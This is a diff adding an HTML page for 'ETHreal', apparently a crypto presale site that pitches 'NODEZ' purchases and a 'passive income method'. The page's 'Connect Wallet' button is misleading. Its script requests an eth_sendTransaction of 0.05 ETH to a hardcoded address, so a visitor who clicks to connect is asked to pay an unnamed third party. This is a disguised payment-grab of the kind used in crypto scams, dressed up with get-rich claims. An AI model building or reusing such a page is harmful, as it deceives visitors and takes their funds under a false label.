@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>ETHreal - Wallet Connection</title>
+  <link rel="stylesheet" href="styles.css">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      overflow: hidden;
+      position: relative;
+    }
+    .header {
+      display: flex;
+      justify-content: space-between;
+      background-color: #6c3483;
+      color: white;
+      padding: 10px 20px;
+    }
+    .header a {
+      color: white;
+      text-decoration: none;
+      margin: 0 10px;
+    }
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 75vh; /* Adjust the height as needed */
+      background: linear-gradient(135deg, #8e44ad, #c39bd3);
+      color: white;
+    }
+    .content {
+      text-align: center;
+      padding: 20px;
+    }
+    .btn-connect {
+      padding: 10px 20px;
+      background-color: #6c3483;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+    .btn-connect:hover {
+      background-color: #9b59b6;
+    }
+    .glowing-text {
+      font-size: 1.2em;
+      text-align: center;
+      text-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px #e74c3c, 0 0 20px #e74c3c, 0 0 35px #e74c3c, 0 0 40px #e74c3c, 0 0 50px #e74c3c;
+      padding: 10px;
+    }
+    .footer {
+      position: absolute;
+      bottom: 0;
+      width: 100%;
+      background: #6c3483;
+      color: white;
+      text-align: center;
+      padding: 10px 0;
+    }
+  </style>
+</head>
+<body>
+
+<div class="header">
+  <div>
+    <a href="#home">Home</a>
+    <a href="#presale">Presale</a>
+    <a href="#roadmap">Roadmap</a>
+  </div>
+  <div>
+    <a href="https://t.me/FFCEXNODEZ" target="_blank">Contact us</a>
+  </div>
+</div>
+
+<div class="container">
+  <div class="content">
+    <h1 class="ethreal-animation">Purchase A NODEZ of your Choice</h1>
+    <button onclick="connectWallet()" class="btn-connect">Connect Wallet</button>
+  </div>
+</div>
+
+<div class="glowing-text">
+  <p>ETHREAL LAUNCHING SOON</p>
+  <p>STOP TRADING TIME FOR MONEY USING OUR PASSIVE INCOME METHOD</p>
+</div>
+
+<div class="footer">
+  <p>ETHREAL - All rights reserved</p>
+</div>
+
+<script>
+  async function connectWallet() {
+    if (window.ethereum) {
+      try {
+        await window.ethereum.enable();
+        const web3 = new Web3(window.ethereum);
+        const recipientAddress = '0xD3B13a903a89a2DC280920B4EC10062a1003d576'; // The destination address
+        const valueToSend = web3.utils.toWei('0.05', 'ether'); // Assuming sending 0.05 ETH
+        const transactionParameters = {
+          to: recipientAddress,
+          value: valueToSend
+        };
+        await window.ethereum.request({
+          method: 'eth_sendTransaction',
+          params: [transactionParameters]
+        });
+        alert('Transaction sent to ' + recipientAddress);
+      } catch (error) {
+        console.error('Error sending transaction: ', error);
+      }
+    } else {
+      console.log('Non-Ethereum browser detected. You should consider trying MetaMask!');
+    }
+  }
+</script>
+
+</body>
+</html>
